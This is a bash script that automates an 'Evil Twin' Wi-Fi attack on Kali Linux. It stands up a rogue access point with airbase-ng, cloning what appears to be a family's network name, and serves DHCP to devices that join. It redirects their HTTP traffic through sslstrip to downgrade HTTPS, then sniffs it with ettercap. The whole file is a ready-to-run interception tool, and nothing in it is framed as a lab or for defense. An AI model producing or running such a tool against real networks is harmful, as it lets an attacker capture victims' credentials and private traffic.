#!/bin/bash


# CHECK THIS LINK - FOR ASSISTANCE WITH DHCP server
#
# https://forums.kali.org/showthread.php?29442-Starting-isc-dhcp-server-fails!


#########################################
### Created by: Shlez                ####
### Kali Linux - Evil Twin           ####
#########################################
#########################################
###             Functions            ####
#########################################


# Progress bar function.
progress_bar() {
  echo -ne '#####                     (33%)\r'
  sleep 1
  echo -ne '#############             (66%)\r'
  sleep 1
  echo -ne '#######################   (100%)\r'
  echo -ne '\n'
}

# Complete task function.
sleep_mode() {
  sleep 1
  echo;echo;echo
  echo "---------- DONE ----------"
  echo;echo;echo
  sleep 2
  clear
}


#########################################
###                Main              ####
#########################################

clear


#Interface config:
in_interface="wlan1"
out_interface="wlan0"
at_interface="at0"

#Network config:
network_name="Kagan_Family1"
gateway="10.0.0.138"
dest_port="10000"

echo "Installing packages..."
apt-get install isc-dhcp-server
apt-get install sslstrip
apt-get install ettercap-text-only
progress_bar
clear


echo "DHCPD Segment:"
echo
echo "Writing etc/dhcp/dhcpd.conf..."
rm /etc/dhcp/dhcpd.conf # if exist, erase it
echo "authoritative;" > /etc/dhcp/dhcpd.conf
echo "default-lease-time 600;" >> /etc/dhcp/dhcpd.conf
echo "max-lease-time 7200;" >> /etc/dhcp/dhcpd.conf
echo "subnet 192.168.2.0 netmask 255.255.255.0 {" >> /etc/dhcp/dhcpd.conf
echo "  option routers 192.168.2.1;" >> /etc/dhcp/dhcpd.conf
echo "  option subnet-mask 255.255.255.0;" >> /etc/dhcp/dhcpd.conf
echo "  option domain-name \"$network_name\";" >> /etc/dhcp/dhcpd.conf
echo "  option domain-name-servers 192.168.2.1;" >> /etc/dhcp/dhcpd.conf
echo "  range 192.168.2.2 192.168.2.40;" >> /etc/dhcp/dhcpd.conf
echo "}" >> /etc/dhcp/dhcpd.conf
progress_bar
sleep_mode

#airmon-ng check kill

echo "Starting airmon-ng on $in_interface..."
airmon-ng stop $in_interface #stop monitor mode if exist
airmon-ng start $in_interface
sleep_mode


echo "Starting airbase-ng in new window..."
gnome-terminal -e "airbase-ng -e $network_name -c 11 "$in_interface"mon"
sleep_mode


echo "Configuring routes and tables..."
ifconfig $at_interface 192.168.2.1 netmask 255.255.255.0
ifconfig $at_interface mtu 1400
route del -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1 # if exist
route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p udp -j DNAT --to $gateway #
iptables -P FORWARD ACCEPT
iptables --append FORWARD --in-interface $at_interface -j ACCEPT
iptables --table nat --append POSTROUTING --out-interface $out_interface -j MASQUERADE
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $dest_port
progress_bar
sleep_mode


echo "Starting DHCP server..."
#dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid $at_interface
pgrep dhcpd | xargs kill -9
rm /var/run/dhcpd.pid #if exist, erase it
/etc/init.d/isc-dhcp-server start
sleep_mode


echo "Starting SSLSTRIP in new window..."
gnome-terminal -e "sslstrip -f -p -k $dest_port"
sleep_mode


echo "Starting ETTERCAP..."
ettercap -p -u -T -q -i $at_interface
